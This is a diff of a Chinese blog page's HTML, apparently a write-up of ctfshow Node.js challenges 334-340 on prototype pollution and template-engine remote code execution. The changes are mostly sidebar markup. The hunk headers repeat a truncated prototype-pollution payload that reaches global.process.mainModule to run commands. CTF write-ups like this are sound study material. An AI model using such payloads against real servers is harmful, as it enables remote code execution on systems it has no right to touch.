+      命令执行做题总结 <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
       </footer>
@@ -504,6 +423,7 @@ payload=`{"__proto__":{"__proto__":{"query":"return global.process.mainModule.co
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#nodejs"><span class="nav-number">1.</span> <span class="nav-text">nodejs</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#nodejs%E7%9A%84rce"><span class="nav-number">2.</span> <span class="nav-text">nodejs的rce</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4"><span class="nav-number">2.1.</span> <span class="nav-text">过滤</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Obejct-values"><span class="nav-number">2.2.</span> <span class="nav-text">Obejct.values</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ejs"><span class="nav-number">3.</span> <span class="nav-text">ejs</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#jade"><span class="nav-number">4.</span> <span class="nav-text">jade</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ctfshow"><span class="nav-number">5.</span> <span class="nav-text">ctfshow</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#334"><span class="nav-number">5.1.</span> <span class="nav-text">334</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#335"><span class="nav-number">5.2.</span> <span class="nav-text">335</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#336"><span class="nav-number">5.3.</span> <span class="nav-text">336</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#337"><span class="nav-number">5.4.</span> <span class="nav-text">337</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#338"><span class="nav-number">5.5.</span> <span class="nav-text">338</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="nav-number">5.5.1.</span> <span class="nav-text">原型链污染</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#339"><span class="nav-number">5.6.</span> <span class="nav-text">339</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#340"><span class="nav-number">5.7.</span> <span class="nav-text">340</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93-1"><span class="nav-number">6.</span> <span class="nav-text">原型链污染</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#merge-a-b"><span class="nav-number">6.1.</span> <span class="nav-text">merge(a.b)</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -519,7 +439,7 @@ payload=`{"__proto__":{"__proto__":{"query":"return global.process.mainModule.co
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">72</span>
+          <span class="site-state-item-count">64</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -532,7 +452,7 @@ payload=`{"__proto__":{"__proto__":{"query":"return global.process.mainModule.co
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-count">94</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
